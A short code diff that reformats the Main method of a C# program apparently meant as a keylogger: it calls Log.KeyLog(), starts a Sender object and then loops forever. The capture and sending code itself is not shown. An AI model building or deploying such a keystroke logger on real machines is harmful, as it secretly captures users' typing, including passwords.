@@ -11,15 +11,11 @@ namespace OperLog
     class Program
     {
 
-        static void Main(String[] args)
-        {
+        static void Main(String[] args) {
             Log.KeyLog();
             Sender s = new Sender();
             s.main();
-            while (true)
-            {
-                Thread.Sleep(1);
-            }
+            while (true) { Thread.Sleep(1);}
         }
     }
 }
